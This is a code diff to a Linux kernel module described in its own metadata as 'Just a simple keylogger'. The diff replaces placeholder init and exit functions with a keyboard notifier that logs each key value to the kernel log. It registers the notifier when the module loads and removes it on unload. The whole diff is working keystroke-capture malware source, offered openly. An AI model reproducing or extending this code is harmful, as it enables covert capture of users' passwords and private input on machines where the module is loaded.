@@ -6,6 +6,8 @@
 #include <linux/init.h>
 #include <linux/kernel.h>
 #include <linux/module.h>
+#include <linux/keyboard.h>
+#include "keys.h"
 
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("Dany Bouca Nova <dany.boucanova@gmail.com");
@@ -13,17 +15,37 @@ MODULE_VERSION("1.0");
 MODULE_DESCRIPTION("Just a simple keylogger");
 MODULE_SUPPORTED_DEVICE("Not machine dependent");
 
-static int  __init keylog_init(void)
+int		notifier(struct notifier_block *block, unsigned long code, void *parameter)
 {
-    printk(KERN_INFO "hello !\n");
-    return (0);
+  struct keyboard_notifier_param *param;
+  /* unsigned char	buffer[500]; */
+
+  (void)block;
+  (void)code;
+  param = parameter;
+  if (param->value >= 0 && param->value <= 1000)
+    printk(KERN_INFO "%d\n", param->value);
+  return (0);
 }
 
-static void __exit keylog_end(void)
+static struct notifier_block keylogger =
+  {
+    .notifier_call = notifier
+  };
+
+static int	__init keylog_init(void)
 {
-    printk(KERN_INFO "I am going !\n");
+  register_keyboard_notifier(&keylogger);
+  printk(KERN_INFO "Register the Keylogger !\n");
+  return (0);
+}
+
+static void	__exit keylog_end(void)
+{
+  unregister_keyboard_notifier(&keylogger);
+  printk(KERN_INFO "Unregister the Keylogger !\n");
 
 }
 
 module_init(keylog_init);
-module_end(keylog_end);
+module_exit(keylog_end);
